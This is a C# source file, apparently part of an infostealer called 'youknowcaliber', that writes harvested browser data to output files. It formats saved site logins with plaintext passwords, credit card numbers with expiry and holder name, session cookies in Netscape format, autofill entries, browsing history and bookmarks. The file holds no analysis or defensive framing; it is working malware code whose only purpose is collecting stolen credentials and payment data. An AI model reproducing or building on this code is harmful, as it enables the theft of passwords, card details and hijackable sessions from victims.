﻿using System;
using System.Collections.Generic;
using System.IO;

namespace youknowcaliber
{
	internal sealed class cBrowserUtils
	{
		private static string FormatPassword(Password pPassword)
		{
			return string.Format("Hostname: {0}\nUsername: {1}\nPassword: {2}\n\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
		}

		private static string FormatCreditCard(CreditCard cCard)
		{
			return string.Format("Type: {0}\nNumber: {1}\nExp: {2}\nHolder: {3}\n\n", new object[]
			{
				Banking.DetectCreditCardType(cCard.sNumber),
				cCard.sNumber,
				cCard.sExpMonth + "/" + cCard.sExpYear,
				cCard.sName
			});
		}

		private static string FormatCookie(Cookie cCookie)
		{
			return string.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", new object[]
			{
				cCookie.sHostKey,
				cCookie.sPath,
				cCookie.sExpiresUtc,
				cCookie.sName,
				cCookie.sValue
			});
		}

		private static string FormatAutoFill(AutoFill aFill)
		{
			return string.Format("{0}\t\n{1}\t\n\n", aFill.sName, aFill.sValue);
		}

		private static string FormatHistory(Site sSite)
		{
			return string.Format("### {0} ### ({1}) {2}\n", sSite.sTitle, sSite.sUrl, sSite.iCount);
		}

		private static string FormatBookmark(Bookmark bBookmark)
		{
			bool flag = !string.IsNullOrEmpty(bBookmark.sUrl);
			string result;
			if (flag)
			{
				result = string.Format("### {0} ### ({1})\n", bBookmark.sTitle, bBookmark.sUrl);
			}
			else
			{
				result = string.Format("### {0} ###\n", bBookmark.sTitle);
			}
			return result;
		}

		public static bool WriteCookies(List<Cookie> cCookies, string sFile)
		{
			bool result;
			try
			{
				foreach (Cookie cCookie in cCookies)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatCookie(cCookie));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		public static bool WriteAutoFill(List<AutoFill> aFills, string sFile)
		{
			bool result;
			try
			{
				foreach (AutoFill aFill in aFills)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatAutoFill(aFill));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		public static bool WriteHistory(List<Site> sHistory, string sFile)
		{
			bool result;
			try
			{
				foreach (Site sSite in sHistory)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatHistory(sSite));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		public static bool WriteBookmarks(List<Bookmark> bBookmarks, string sFile)
		{
			bool result;
			try
			{
				foreach (Bookmark bBookmark in bBookmarks)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatBookmark(bBookmark));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		public static bool WritePasswords(List<Password> pPasswords, string sFile)
		{
			bool result;
			try
			{
				foreach (Password pPassword in pPasswords)
				{
					bool flag = pPassword.sUsername == "" || pPassword.sPassword == "";
					if (!flag)
					{
						File.AppendAllText(sFile, cBrowserUtils.FormatPassword(pPassword));
					}
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		public static bool WriteCreditCards(List<CreditCard> cCC, string sFile)
		{
			bool result;
			try
			{
				foreach (CreditCard cCard in cCC)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatCreditCard(cCard));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
